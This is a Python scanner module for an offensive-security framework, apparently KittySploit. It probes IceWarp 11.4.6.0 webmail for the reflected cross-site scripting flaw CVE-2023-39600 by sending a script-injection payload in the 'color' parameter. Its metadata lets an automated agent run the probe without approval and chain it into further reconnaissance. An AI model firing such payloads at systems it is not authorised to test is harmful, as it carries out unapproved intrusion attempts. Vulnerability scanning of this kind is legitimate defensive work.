#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""IceWarp 11."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'IceWarp 11.4.6.0 - Cross-Site Scripting Detection',
        'description': 'IceWarp 11.4.6.0 was discovered to contain a cross-site scripting (XSS) vulnerability via the color parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'icewarp', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://medium.com/@katikitala.sushmitha078/cross-site-scripting-reflected-xss-in-icewarp-server-cve-2023-39600-310a7e1c8817',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-39600',
            'https://icewarp.com',
            'https://medium.com/%40katikitala.sushmitha078/cross-site-scripting-reflected-xss-in-icewarp-server-cve-2023-39600-310a7e1c8817',
        ],
        'cve': 'CVE-2023-39600',
    }

    def run(self):
        r = self.http_request(method="GET", path='/webmail/?color="><img src=x onerror=confirm(document.domain)>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('<img src=x onerror=confirm(document.domain)>', 'IceWarp',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="IceWarp 11.4.6.0 - Cross-Site Scripting detected",
                path='/webmail/?color="><img src=x onerror=confirm(document.domain)>',
            )
            return True
        return False

